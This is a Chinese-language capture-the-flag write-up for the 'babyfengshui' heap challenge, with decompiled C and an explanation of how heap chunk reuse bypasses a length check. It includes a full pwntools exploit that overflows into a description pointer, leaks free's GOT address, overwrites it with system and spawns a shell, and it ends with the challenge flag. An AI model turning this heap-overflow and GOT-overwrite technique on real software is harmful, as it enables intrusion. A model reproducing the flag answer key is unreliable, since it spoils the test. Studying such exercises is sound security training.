# babyfengshui

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=6fb8d5be-7266-4cee-a22b-1fe438c0ef91_2&task_category_id=2)

这题应该当作堆入门题，攻防世界奇怪的题目分级又出现了。

开局checksec。

-   Arch:     i386-32-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x8048000)

Partial RELRO，又是搞got表的一天。进入main函数，又又又是菜单式程序。

```c
void Main(void)
{
  int iVar1;
  int in_GS_OFFSET;
  undefined *puVar2;
  undefined local_1d;
  int choice;
  uint index;
  undefined4 local_14;
  undefined *puStack12;
  puStack12 = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdin,(char *)0x0,2,0);
  puVar2 = (undefined *)0x2;
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x14);
  while( true ) {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    iVar1 = __isoc99_scanf(&DAT_08048d74,&choice);
    if (iVar1 == -1) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    if (choice == 0) {
      printf("size of description: ");
      puVar2 = &local_1d;
      __isoc99_scanf(&DAT_08048cbe,&index,puVar2);
      AddUser(index);
    }
    if (choice == 1) {
      printf("index: ");
      __isoc99_scanf(&DAT_08048d74,&index,puVar2);
      DeleteUser(index & 0xff);
    }
    if (choice == 2) {
      printf("index: ");
      __isoc99_scanf(&DAT_08048d74,&index);
      DisplayUser(index & 0xff);
    }
    if (choice == 3) {
      printf("index: ");
      __isoc99_scanf(&DAT_08048d74,&index);
      UpdataUserDesc(index & 0xff);
    }
    if (choice == 4) break;
    if (0x31 < DAT_0804b069) {
      puts("maximum capacity exceeded, bye");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  puts("Bye");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

来呗，一个一个看。

```c
void ** AddUser(size_t param_1)
{
  int iVar1;
  byte bVar2;
  void *__s;
  void **__s_00;
  int in_GS_OFFSET;
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  __s = malloc(param_1);
  memset(__s,0,param_1);
  __s_00 = (void **)malloc(0x80);
  memset(__s_00,0,0x80);
  *__s_00 = __s;
  *(void ***)(&DAT_0804b080 + (uint)DAT_0804b069 * 4) = __s_00;
  printf("name: ");
  FUN_080486bb(*(int *)(&DAT_0804b080 + (uint)DAT_0804b069 * 4) + 4,0x7c);
  bVar2 = DAT_0804b069;
  DAT_0804b069 = DAT_0804b069 + 1;
  UpdataUserDesc(bVar2);
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return __s_00;
}
```

添加用户的结构体由两部分组成，一部分固定0x80的大小，另一部分是desc，由我们传入的大小决定（相关变量被我重命名成index，因为后面是index的作用，但这里不是）。别的也没啥了，总不可能添加个用户就出现致命漏洞吧？

```c
void DeleteUser(byte param_1)
{
  int iVar1;
  int in_GS_OFFSET;
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  if ((param_1 < DAT_0804b069) && (*(int *)(&DAT_0804b080 + (uint)param_1 * 4) != 0)) {
    free(**(void ***)(&DAT_0804b080 + (uint)param_1 * 4));
    free(*(void **)(&DAT_0804b080 + (uint)param_1 * 4));
    *(undefined4 *)(&DAT_0804b080 + (uint)param_1 * 4) = 0;
  }
  if (iVar1 == *(int *)(in_GS_OFFSET + 0x14)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

不想看到0，因为这意味着没有uaf了。继续往下看。

```c
void DisplayUser(byte param_1)
{
  int iVar1;
  int in_GS_OFFSET;
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  if ((param_1 < DAT_0804b069) && (*(int *)(&DAT_0804b080 + (uint)param_1 * 4) != 0)) {
    printf("name: %s\n",*(int *)(&DAT_0804b080 + (uint)param_1 * 4) + 4);
    printf("description: %s\n",**(undefined4 **)(&DAT_0804b080 + (uint)param_1 * 4));
  }
  if (iVar1 == *(int *)(in_GS_OFFSET + 0x14)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

就很正常，打印有记录的所有用户和描述。没啥东西。

```c
void UpdataUserDesc(byte param_1)
{
  int in_GS_OFFSET;
  undefined local_15;
  int local_14;
  int local_10;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  if ((param_1 < DAT_0804b069) && (*(int *)(&DAT_0804b080 + (uint)param_1 * 4) != 0)) {
    local_14 = 0;
    printf("text length: ");
    __isoc99_scanf(&DAT_08048cbe,&local_14,&local_15);
    if (*(int *)(&DAT_0804b080 + (uint)param_1 * 4) - 4U <=
        (uint)(**(int **)(&DAT_0804b080 + (uint)param_1 * 4) + local_14)) {
      puts("my l33t defenses cannot be fooled, cya!");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("text: ");
    FUN_080486bb(**(undefined4 **)(&DAT_0804b080 + (uint)param_1 * 4),local_14 + 1);
  }
  if (local_10 == *(int *)(in_GS_OFFSET + 0x14)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

根据ctf打脸定律，出题人在哪里说“无解”的地方哪里就大概率是突破点。比如这里，作者说这么1337的防御不可能会被绕过，那么我们的目标很可能就是绕过这个防御。那看看这个防御是啥。

```c
if (*(int *)(&DAT_0804b080 + (uint)param_1 * 4) - 4U <=
        (uint)(**(int **)(&DAT_0804b080 + (uint)param_1 * 4) + local_14)) {
      puts("my l33t defenses cannot be fooled, cya!");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
```

param_1是更新的用户的索引，local_14是要更新的desc长度。其实我没办法跟大佬们一样清晰看出这行的逻辑“(Desc堆地址+数据长度length)不能大于等于(Note地址- 4)”，我只能看出来某个地址-4不能小于等于某个地址加上local_14。唉还是要多做题啊。

但是能猜到的是，虽然(&DAT_0804b080 + (uint)param_1 * 4)这段在两处都有出现且完全一致，但它们肯定不能指代一个地址，不然这个判断纯粹就是来搞笑的。不是一个地址却还能通过-4这样来判断，两者只能相邻。根据AddUser函数得到的信息，一个用户正好有两部分，固定的0x80和desc部分。desc可以看出来是个指针，故一旦被控制就可以随意改写地址。

无解的防御在两者相邻时无解，假如我们能让两者不相邻呢？堆管理器分配chunk的时候，如果有现成的chunk就不会重新从top chunk切一块下来了。我先放exp吧，放出来才好剖析。

```python
from pwn import *
p = remote("61.147.171.105",57973)
def Add(size,length,text):
	p.sendlineafter("Action: ",'0')
	p.sendlineafter("description: ",str(size))
	p.sendlineafter("name: ",'ffff')
	p.sendlineafter("length: ",str(length))
	p.sendlineafter("text: ",text)
def Del(index):
	p.sendlineafter("Action: ",'1')
	p.sendlineafter("index: ",str(index))
def Display(index):
	p.sendlineafter("Action: ",'2')
	p.sendlineafter("index: ",str(index))
def Update(index,length,text):
	p.sendlineafter("Action: ",'3')
	p.sendlineafter("index: ",str(index))
	p.sendlineafter("length: ",str(length))
	p.sendlineafter("text: ",text)
Add(0x80,0x80,"a") 
Add(0x80,0x80,"a")
Add(0x8,0x8,"/bin/sh\x00")
Del(0)
free_got=134524944
payload =b'a'*0x198+p32(free_got)
Add(0x108,0x19C,payload)
Display(1)
p.recvuntil("description: ")
free_addr = u32(p.recv(4))
system_offset=-0x35e10
Update(1,4,p32(free_addr+system_offset)) 
Del(2)
p.interactive()
```

首先Add三个用户，第一个用来释放，第二个用来当被溢出的chunk，第三个提前把要用的/bin/sh放好。Del释放掉索引0处的user，由于我们设置desc长度为0x80，释放时结构体固定的0x80和desc的0x80就会合并（unlink）。接下来我们再添加一个用户，desc大小为0x108。0x108是因为堆头也有8个字节，0x80+0x80=0x100，再加0x8=0x108，这才保证了大小的完全一致。0x19c的内容可以完美溢出到下一个用户并改写第二个用户的desc指针为free。至于为什么是0x19c，desc的0x108+用户2的结构体堆头0x8+用户2的结构体0x80+用户2的desc堆头0x8,这样是0x198，正好到达用户2desc的起点。再来8个字节写free地址，故再+4（32位），0x198+0x4=0x19c。

现在结构体和desc就没有挨在一起了，防御便失效了。打印用户2的信息便可以得到free的真实地址。updata更改free的got表为system地址，完成got表改写。最后删除提前预留好/bin/sh的用户即getshell。

- ### Flag
  > cyberpeace{b7a2cb035785cc1ded8e18ecf25809dd}